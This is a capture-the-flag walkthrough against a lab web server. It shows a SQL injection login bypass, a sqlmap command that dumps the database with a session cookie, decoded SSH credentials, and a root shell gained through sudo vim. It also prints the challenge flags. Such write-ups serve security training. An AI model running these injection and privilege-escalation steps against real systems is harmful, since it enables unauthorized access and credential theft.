

# Step 1

Find page http://0.0.0.0/admin.php

The login form is vulnerable to SQL Injection:

```
username: ' OR 1=1;
pass: toto
```

To see the login succeed, you must refresh page twice.

First flag : **${CEH_Step1_SQLi}**

# Step 2

When choosing a server in the list, the url change with the ID of server.

To be able to test it with `sqlmap` we need to get the `PHPSESSID` cookie:

```
right click on "inspect"
go to "application" tab
then "cookies" menu
and select the value for PHPSESSID
```

Now we can set our `sqlmap` command:

```bash
sqlmap -u "http://0.0.0.0/admin.php?server=0" --cookie="PHPSESSID=lnmqqj5141kvp40dvq9a0bkun3" --dbms=mysql --dump
```

Tables and columns are dumped and we can get credentials of servers.

A table have a flag name: **${EHC_BetweenUS}**

# Step 3

In table `servers` the `WEBSRV3` credentials are the only good one.

`creds` are encoded using base64, when decoded:

```yml
pvexuser3ro:J3Sape1R00t
```

We can then log in via SSH:

```bash
ssh pvexuser3ro@0.0.0.0 -p 2222
```


```bash
> ls -al
.
..
flag

> cat flag
real flag has been move to /root

> cat /root/flag
cat: /root/flag: Permission denied

> sudo cat /root/flag
Sorry, user pvexuser3ro is not allowed to execute '/bin/cat /root/flag' as root on 0.0.0.0.

> sudo -l
User pvexuser3ro may run the following commands on c853cdd9be0d:
    (root) NOPASSWD: /usr/bin/vim

> sudo vim -c '!sh'
> whoami
root

> cat /root/flag
${EHC_ChampionDuSudo}

```

Last flag: **${EHC_ChampionDuSudo}**

---

THE END
